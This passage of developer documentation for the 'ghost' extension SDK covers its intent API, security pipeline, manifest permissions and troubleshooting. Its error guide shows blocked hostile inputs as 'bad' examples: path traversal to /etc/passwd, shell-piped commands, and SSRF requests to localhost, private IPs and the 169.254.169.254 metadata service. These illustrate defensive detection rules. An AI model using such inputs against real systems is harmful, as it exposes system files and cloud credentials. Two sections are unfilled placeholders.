const result = await sdk.requestGitExec({
    operation: 'status',
    args: ['--short']
});
```

#### Convenience Methods

```javascript
// Git status
const status = await sdk.requestGitStatus(['--short']);

// Git log
const log = await sdk.requestGitLog(['--oneline', '-10']);

// Git diff
const diff = await sdk.requestGitDiff(['HEAD~1', 'HEAD']);
```

### Low-Level API

#### emitIntent(intent)

Send a custom intent directly:

```javascript
const response = await sdk.emitIntent({
    type: 'filesystem',
    operation: 'read',
    params: { path: './file.txt' }
});

if (!response.success) {
    console.error('Error:', response.error);
}
```

#### buildIntent()

Use the builder pattern:

```javascript
const builder = sdk.buildIntent();

const intent = builder.filesystem('read', { path: './file.txt' });
const response = await sdk.emitIntent(intent);
```

### Batch Operations

```javascript
const { RPCClient } = require('@ghost/extension-sdk');

const client = new RPCClient('my-extension');
const builder = sdk.buildIntent();

const intents = [
    builder.filesystem('read', { path: './file1.txt' }),
    builder.filesystem('read', { path: './file2.txt' }),
    builder.filesystem('read', { path: './file3.txt' })
];

const responses = await client.sendBatch(intents);
```

## Pipeline Architecture

### 1. Intercept Layer

**Purpose**: Validate and normalize incoming intents

**Validations**:
- JSON-RPC format compliance
- Schema validation (type, operation, params)
- Required field presence

**Error Codes**:
- `PIPELINE_INTERCEPT_ERROR` - Schema validation failed

### 2. Authorization Layer

**Purpose**: Enforce permissions and rate limits

**Checks**:
- Extension is registered
- Capability declarations match intent type
- Filesystem path patterns (glob matching)
- Network URL allowlists
- Git read/write permissions
- Rate limits (CIR/Bc token bucket)

**Error Codes**:
- `PERMISSION_DENIED` - Missing capability
- `PATH_NOT_ALLOWED` - Filesystem path violation
- `URL_NOT_ALLOWED` - Network URL not in allowlist
- `RATE_LIMIT_EXCEEDED` - Too many requests

### 3. Audit Layer

**Purpose**: Security scanning and logging

**Validations**:
- NIST 800-53 compliance checks
- Entropy analysis for secrets/keys
- Content pattern matching
- Security event logging

**Error Codes**:
- `AUDIT_FAILED` - Security violation detected
- `HIGH_ENTROPY_DETECTED` - Possible secret in content

### 4. Execution Layer

**Purpose**: Execute operations safely

**Features**:
- Circuit breakers (prevent cascade failures)
- Timeout management
- Resource cleanup
- Error handling

**Error Codes**:
- `PIPELINE_EXECUTION_ERROR` - Operation failed
- `CIRCUIT_BREAKER_OPEN` - Too many failures
- `TIMEOUT_EXCEEDED` - Operation took too long

## API Reference

[Previous API Reference content remains the same...]

## Examples

[Previous Examples content remains the same...]

## Security Model

### Capability Declarations

All capabilities must be declared in `manifest.json`:

```json
{
    "capabilities": {
        "filesystem": {
            "read": ["**/*.js", "package.json"],
            "write": ["dist/**"]
        },
        "network": {
            "allowlist": [
                "https://api.github.com",
                "https://api.example.com"
            ],
            "rateLimit": {
                "cir": 60,
                "bc": 100
            }
        },
        "git": {
            "read": true,
            "write": false
        }
    }
}
```

### Rate Limiting

Network capabilities use Two-Rate Three-Color (trTCM) traffic policing:

- **CIR** (Committed Information Rate): Sustained requests per minute
- **Bc** (Burst Committed): Maximum burst size

Example: `"cir": 60, "bc": 100` allows 60 requests/minute sustained, with bursts up to 100.

### Audit Logging

All operations are logged to `~/.ghost/audit.log`:

```json
{
    "timestamp": "2024-01-15T10:30:00.000Z",
    "type": "SECURITY_EVENT",
    "extensionId": "my-extension",
    "message": "Rate limit exceeded",
    "violations": [...]
}
```

View logs:

```bash
ghost audit-log view --limit 50 --extension my-extension
```

## Troubleshooting

Common errors and their resolutions.

### Permission Errors

#### AUTH_PERMISSION_DENIED

**Error Message**: "Permission denied: network access not allowed"

**Cause**: Extension attempting to use capability not declared in manifest

**Resolution**:
1. Add required capability to `manifest.json`:
   ```json
   {
       "capabilities": {
           "network": {
               "allowlist": ["https://api.example.com"]
           }
       }
   }
   ```
2. Validate manifest: `ghost extension validate`
3. Reinstall extension: `ghost extension install .`

#### PATH_NOT_ALLOWED

**Error Message**: "Path './data/file.txt' does not match any declared patterns"

**Cause**: Filesystem path not matching manifest glob patterns

**Resolution**:
1. Check current patterns in manifest
2. Add matching pattern to capabilities:
   ```json
   {
       "capabilities": {
           "filesystem": {
               "read": ["data/**/*.txt", "**/*.json"]
           }
       }
   }
   ```
3. Test pattern matching: `ghost extension validate --test-path ./data/file.txt`

#### URL_NOT_ALLOWED

**Error Message**: "URL 'https://api.other.com' not in allowlist"

**Cause**: Network URL not in manifest allowlist

**Resolution**:
1. Add URL origin to allowlist:
   ```json
   {
       "capabilities": {
           "network": {
               "allowlist": [
                   "https://api.github.com",
                   "https://api.other.com"
               ]
           }
       }
   }
   ```
2. Note: Must match protocol, domain, and port (e.g., `http://localhost:3000` ≠ `http://localhost:8080`)

### Rate Limiting Errors

#### AUTH_RATE_LIMIT

**Error Message**: "Rate limit exceeded"

**Cause**: Extension exceeded configured CIR/Bc limits

**Resolution**:
1. **Immediate**: Implement exponential backoff
   ```javascript
   async function fetchWithRetry(url, maxRetries = 3) {
       for (let i = 0; i < maxRetries; i++) {
           try {
               return await sdk.requestNetworkCall({ url });
           } catch (error) {
               if (error.code === 'AUTH_RATE_LIMIT' && i < maxRetries - 1) {
                   const backoff = Math.pow(2, i) * 1000;
                   await new Promise(resolve => setTimeout(resolve, backoff));
                   continue;
               }
               throw error;
           }
       }
   }
   ```
2. **Long-term**: Adjust rate limits in manifest
   ```json
   {
       "capabilities": {
           "network": {
               "rateLimit": {
                   "cir": 120,
                   "bc": 200
               }
           }
       }
   }
   ```
3. **Optimization**: Cache responses, batch requests, reduce polling frequency

### Validation Errors

#### SI-10-PATH-TRAVERSAL

**Error Message**: "Path traversal attempt detected"

**Cause**: Path contains `..` or absolute path components

**Resolution**:
1. Use relative paths within workspace:
   ```javascript
   // ❌ Bad
   { path: '../../etc/passwd' }
   { path: '/etc/passwd' }
   
   // ✅ Good
   { path: './src/config.json' }
   { path: 'data/file.txt' }
   ```
2. Resolve paths relative to workspace root
3. Avoid user-controlled path inputs without validation

#### SI-10-COMMAND-INJECTION

**Error Message**: "Command injection attempt detected"

**Cause**: Command contains shell metacharacters (`;`, `|`, `&`, `$()`)

**Resolution**:
1. Use process spawn with separate arguments:
   ```javascript
   // ❌ Bad
   {
       type: 'process',
       operation: 'exec',
       params: { command: 'ls -la | grep txt' }
   }
   
   // ✅ Good
   {
       type: 'process',
       operation: 'spawn',
       params: {
           command: 'ls',
           args: ['-la']
       }
   }
   ```
2. For git commands, use args array:
   ```javascript
   {
       type: 'git',
       operation: 'log',
       params: { args: ['--oneline', '-10'] }
   }
   ```

#### SI-10-SSRF-LOCALHOST / SI-10-SSRF-PRIVATE-IP

**Error Message**: "SSRF attempt to localhost blocked" or "Private IP access blocked"

**Cause**: URL targets localhost, 127.0.0.1, or private IP range

**Resolution**:
1. Use only public URLs:
   ```javascript
   // ❌ Bad
   { url: 'http://localhost:3000/api' }
   { url: 'http://192.168.1.1/admin' }
   { url: 'http://10.0.0.1/internal' }
   
   // ✅ Good
   { url: 'https://api.example.com/public' }
   ```
2. For local development: Use public tunneling service (ngrok, localtunnel)
3. For internal APIs: Deploy to public endpoint with proper authentication

#### SI-10-SSRF-METADATA

**Error Message**: "Metadata service access blocked"

**Cause**: URL targets cloud metadata service (169.254.169.254)

**Resolution**:
1. Never access metadata services from extensions
2. If you need instance metadata, use environment variables:
   ```javascript
   const instanceId = process.env.INSTANCE_ID;
   ```
3. Configure metadata in manifest config section

#### SI-10-CONTENT-SECRETS

**Error Message**: "Secrets detected in write content"

**Cause**: High-entropy strings detected in file write content or network request body

**Resolution**:
1. Use environment variables for secrets:
   ```javascript
   // ❌ Bad
   const config = {
       apiKey: 'sk_live_51HqQ8RKZ...'
   };
   await sdk.requestFileWrite({
       path: './config.json',
       content: JSON.stringify(config)
   });
   
   // ✅ Good
   const config = {
       apiKey: process.env.API_KEY
   };
   // Don't write secrets to files
   ```
2. For network requests, use headers (not body):
   ```javascript
   await sdk.requestNetworkCall({
       url: 'https://api.example.com/data',
       headers: {
           'Authorization': `Bearer ${process.env.API_TOKEN}`
       }
   });
   ```

### Execution Errors

#### TIMEOUT_EXCEEDED

**Error Message**: "Operation exceeded timeout of 30000ms"

**Cause**: Operation took longer than configured timeout

**Resolution**:
1. Increase timeout for slow operations:
   ```javascript
   await sdk.requestNetworkCall({
       url: 'https://api.slow-service.com/endpoint',
       timeout: 60000  // 60 seconds
   });
   ```
2. Optimize operation (reduce data transfer, use streaming)
3. Implement pagination for large datasets

#### CIRCUIT_BREAKER_OPEN

**Error Message**: "Circuit breaker open due to consecutive failures"

**Cause**: Too many consecutive failures triggered circuit breaker

**Resolution**:
1. Wait for circuit breaker reset (typically 60 seconds)
2. Fix underlying issue causing failures
3. Check target service availability
4. Implement proper error handling and retries

### Extension Process Errors

#### Extension Fails to Start

**Symptoms**: Extension state remains "STARTING" or transitions to "FAILED"

**Diagnosis**:
```bash
ghost gateway status
ghost audit-log view --extension my-extension --limit 10
```

**Common Causes**:
1. **Invalid manifest**: Missing required fields (id, name, version, main)
   - Fix: Validate manifest with `ghost extension validate`

2. **Main file not found**: Path in manifest.main doesn't exist
   - Fix: Check file path, ensure relative to extension root

3. **Initialization timeout**: Extension doesn't respond to init within 10s
   - Fix: Ensure extension responds to JSON-RPC `init` request
   
4. **Runtime errors**: Exception during initialization
   - Fix: Check stderr logs for stack traces

#### Extension Crashes Repeatedly

**Symptoms**: Extension restarts frequently, state changes to "FAILED"

**Diagnosis**:
```bash
ghost gateway metrics my-extension
# Check restart count, consecutive restarts
```

**Causes & Resolutions**:
1. **Memory leak**: Process crashes due to OOM
   - Monitor: `process.memoryUsage()`
   - Fix: Profile and fix memory leaks

2. **Unhandled exceptions**: Uncaught errors crash process
   - Fix: Add global error handlers:
     ```javascript
     process.on('uncaughtException', (error) => {
         console.error('Uncaught exception:', error);
         // Graceful cleanup
     });
     ```

3. **Heartbeat failures**: Extension becomes unresponsive
   - Fix: Ensure event loop not blocked by long-running operations

### Common Manifest Issues

#### Invalid Glob Patterns

**Error**: Files not accessible despite permission

**Cause**: Glob pattern syntax error or too restrictive

**Resolution**:
```json
// Common glob patterns
{
    "capabilities": {
        "filesystem": {
            "read": [
                "**/*.js",           // All .js files recursively
                "src/**/*",          // Everything in src/
                "*.json",            // .json files in root only
                "test/**/*.test.js"  // Test files in test/
            ]
        }
    }
}
```

#### Circular or Conflicting Patterns

**Error**: Permission denied despite matching pattern

**Cause**: Deny pattern overrides allow pattern

**Resolution**: Ensure allow patterns are specific enough to override implicit denies

### Debugging Tips

1. **Enable verbose logging**:
   ```bash
   GHOST_DEBUG=1 ghost my-command
   ```

2. **Check audit logs**:
   ```bash
   ghost audit-log view --extension my-extension --limit 100
   ```

3. **Inspect gateway state**:
   ```bash
   ghost gateway status
   ghost gateway metrics my-extension
   ```

4. **Validate manifest**:
   ```bash
   ghost extension validate
   ghost extension validate --test-path ./src/file.js
   ```

5. **Test intent manually**:
   ```javascript
   const { ExtensionSDK } = require('@ghost/extension-sdk');
   const sdk = new ExtensionSDK('test-extension');
   
   const response = await sdk.emitIntent({
       type: 'filesystem',
       operation: 'read',
       params: { path: './test.txt' }
   });
   
   console.log(JSON.stringify(response, null, 2));
   ```

## Best Practices

### 1. Handle Errors Gracefully

```javascript
try {
    const result = await sdk.requestFileRead({ path: './file.txt' });
} catch (error) {
    console.error('Failed to read file:', error.message);
    return { success: false, error: error.message };
}
```

### 2. Validate Inputs

```javascript
async myCommand(params) {
    const { args } = params;
    
    if (!args || args.length === 0) {
        return {
            success: false,
            error: 'Missing required arguments'
        };
    }
    
    // Process...
}
```

### 3. Use Minimal Permissions

Request only the capabilities you need:

```json
{
    "capabilities": {
        "filesystem": {
            "read": ["src/**/*.js"],
            "write": []  // Don't request write if not needed
        }
    }
}
```

### 4. Implement Proper Cleanup

```javascript
class MyExtension {
    async shutdown() {
        // Clean up resources
        if (this.connection) {
            await this.connection.close();
        }
    }
}
```

### 5. Use Batch Operations When Possible

```javascript
// Instead of sequential reads:
for (const file of files) {
    await sdk.requestFileRead({ path: file });
}

// Use batch operations:
const intents = files.map(file => 
    builder.filesystem('read', { path: file })
);
const results = await client.sendBatch(intents);
```

### 6. Respect Rate Limits

```javascript
async makeApiCall(url) {
    try {
        return await this.sdk.requestNetworkCall({ url });
    } catch (error) {
        if (error.message.includes('rate limit')) {
            // Wait and retry
            await this.delay(1000);
            return await this.sdk.requestNetworkCall({ url });
        }
        throw error;
    }
}
```

## CLI Commands

### Development Commands

```bash
# Create new extension
ghost extension init my-extension

# Validate manifest and permissions
ghost extension validate

# Install extension
ghost extension install .

# List installed extensions
ghost extension list

# Show extension info
ghost extension info my-extension-id

# Remove extension
ghost extension remove my-extension-id
```

### Gateway Commands

```bash
# Show gateway status
ghost gateway status

# Show telemetry metrics
ghost gateway metrics my-extension-id

# View audit logs
ghost audit-log view --limit 100 --extension my-extension-id
```

## Resources

- [Manifest Reference](../core/MANIFEST_REFERENCE.md)
- [Extension Development Guide](../core/EXTENSION_GUIDE.md)
- [Pipeline Architecture](../core/ARCHITECTURE.md)
- [@ghost/extension-sdk NPM Package](../packages/extension-sdk/README.md)

## Support

- GitHub Issues: https://github.com/lamallamadel/ghost/issues
- Documentation: https://github.com/lamallamadel/ghost
